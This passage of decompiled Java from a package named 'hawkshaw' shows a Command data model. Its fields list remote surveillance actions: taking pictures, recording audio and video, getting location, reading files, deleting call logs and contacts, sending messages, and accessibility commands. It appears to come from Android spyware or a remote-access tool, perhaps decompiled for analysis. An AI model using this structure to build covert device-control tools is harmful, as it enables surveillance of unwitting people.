            if (r27 == 0) goto L_0x0103
            r27 = 0
            goto L_0x0105
        L_0x0103:
            r27 = r59
        L_0x0105:
            r28 = 134217728(0x8000000, float:3.85186E-34)
            r28 = r0 & r28
            if (r28 == 0) goto L_0x010e
            r28 = 0
            goto L_0x0110
        L_0x010e:
            r28 = r60
        L_0x0110:
            r29 = 268435456(0x10000000, float:2.524355E-29)
            r29 = r0 & r29
            if (r29 == 0) goto L_0x0119
            r29 = 0
            goto L_0x011b
        L_0x0119:
            r29 = r61
        L_0x011b:
            r30 = 536870912(0x20000000, float:1.0842022E-19)
            r0 = r0 & r30
            if (r0 == 0) goto L_0x0123
            r0 = 0
            goto L_0x0125
        L_0x0123:
            r0 = r62
        L_0x0125:
            r32 = r31
            r33 = r1
            r34 = r2
            r36 = r4
            r37 = r6
            r38 = r7
            r39 = r8
            r40 = r9
            r41 = r10
            r42 = r11
            r43 = r12
            r44 = r13
            r45 = r14
            r46 = r15
            r47 = r64
            r48 = r5
            r49 = r16
            r50 = r17
            r51 = r18
            r52 = r19
            r53 = r20
            r54 = r21
            r55 = r22
            r56 = r23
            r57 = r24
            r58 = r25
            r59 = r26
            r60 = r27
            r61 = r28
            r62 = r29
            r63 = r0
            r32.<init>(r33, r34, r36, r37, r38, r39, r40, r41, r42, r43, r44, r45, r46, r47, r48, r49, r50, r51, r52, r53, r54, r55, r56, r57, r58, r59, r60, r61, r62, r63)
            return
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.<init>(com.hawkshaw.library.datalayer.models.Command$CommandType, long, com.hawkshaw.library.datalayer.models.Command$ThumbnailRequest, com.hawkshaw.library.datalayer.models.Command$FileRequest, com.hawkshaw.library.datalayer.models.Command$FilesRequest, com.hawkshaw.library.datalayer.models.Command$DeletePendingPushFilesRequest, com.hawkshaw.library.datalayer.models.Command$DeleteFileRequest, com.hawkshaw.library.datalayer.models.Command$AddCallLogRequest, com.hawkshaw.library.datalayer.models.Command$DeleteCallLogRequest, com.hawkshaw.library.datalayer.models.Command$AddContactRequest, com.hawkshaw.library.datalayer.models.Command$DeleteContactRequest, com.hawkshaw.library.datalayer.models.Command$SendMessageRequest, com.hawkshaw.library.datalayer.models.Command$GetLocationRequest, com.hawkshaw.library.datalayer.models.Command$VibrateRequest, com.hawkshaw.library.datalayer.models.Command$FlashRequest, com.hawkshaw.library.datalayer.models.Command$TakePictureRequest, com.hawkshaw.library.datalayer.models.Command$RecordVideoRequest, com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest, com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest, com.hawkshaw.library.datalayer.models.Command$OpenAppRequest, com.hawkshaw.library.datalayer.models.Command$MakeCallRequest, com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest, com.hawkshaw.library.datalayer.models.Command$OpenDeeplinkRequest, com.hawkshaw.library.datalayer.models.Command$LoginRequest, com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest, com.hawkshaw.library.datalayer.models.Command$CancelScheduledCommandRequest, com.hawkshaw.library.datalayer.models.Command$AccessibilityCommandRequest, com.hawkshaw.library.datalayer.models.Command$StartRepeatPushDataRequest, com.hawkshaw.library.datalayer.models.Command$SetDynamicConfigRequest, com.hawkshaw.library.datalayer.models.Command$SyncAppConfigRequest, int, j3.f):void");
    }

    public Command(CommandType commandType, long j5, ThumbnailRequest thumbnailRequest2, FileRequest fileRequest2, FilesRequest filesRequest2, DeletePendingPushFilesRequest deletePendingPushFilesRequest2, DeleteFileRequest deleteFileRequest2, AddCallLogRequest addCallLogRequest2, DeleteCallLogRequest deleteCallLogRequest2, AddContactRequest addContactRequest2, DeleteContactRequest deleteContactRequest2, SendMessageRequest sendMessageRequest2, GetLocationRequest getLocationRequest2, VibrateRequest vibrateRequest2, FlashRequest flashRequest2, TakePictureRequest takePictureRequest2, RecordVideoRequest recordVideoRequest2, RecordAudioRequest recordAudioRequest2, PushDeviceInfoRequest pushDeviceInfoRequest, OpenAppRequest openAppRequest2, MakeCallRequest makeCallRequest2, DeviceAudioRequest deviceAudioRequest, OpenDeeplinkRequest openDeeplinkRequest2, LoginRequest loginRequest2, ScheduleCommandRequest scheduleCommandRequest2, CancelScheduledCommandRequest cancelScheduledCommandRequest2, AccessibilityCommandRequest accessibilityCommandRequest2, StartRepeatPushDataRequest startRepeatPushDataRequest2, SetDynamicConfigRequest setDynamicConfigRequest2, SyncAppConfigRequest syncAppConfigRequest2) {
        K.n(commandType, "type");
        this.type = commandType;
        this.sentTime = j5;
        this.thumbnailRequest = thumbnailRequest2;
        this.fileRequest = fileRequest2;
        this.filesRequest = filesRequest2;
        this.deletePendingPushFilesRequest = deletePendingPushFilesRequest2;
        this.deleteFileRequest = deleteFileRequest2;
        this.addCallLogRequest = addCallLogRequest2;
        this.deleteCallLogRequest = deleteCallLogRequest2;
        this.addContactRequest = addContactRequest2;
        this.deleteContactRequest = deleteContactRequest2;
        this.sendMessageRequest = sendMessageRequest2;
        this.getLocationRequest = getLocationRequest2;
        this.vibrateRequest = vibrateRequest2;
        this.flashRequest = flashRequest2;
        this.takePictureRequest = takePictureRequest2;
        this.recordVideoRequest = recordVideoRequest2;
        this.recordAudioRequest = recordAudioRequest2;
        this.deviceInfoRequest = pushDeviceInfoRequest;
        this.openAppRequest = openAppRequest2;
        this.makeCallRequest = makeCallRequest2;
        this.setDeviceAudioRequest = deviceAudioRequest;
        this.openDeeplinkRequest = openDeeplinkRequest2;
        this.loginRequest = loginRequest2;
        this.scheduleCommandRequest = scheduleCommandRequest2;
        this.cancelScheduledCommandRequest = cancelScheduledCommandRequest2;
        this.accessibilityCommandRequest = accessibilityCommandRequest2;
        this.startRepeatPushDataRequest = startRepeatPushDataRequest2;
        this.setDynamicConfigRequest = setDynamicConfigRequest2;
        this.syncAppConfigRequest = syncAppConfigRequest2;
    }
}
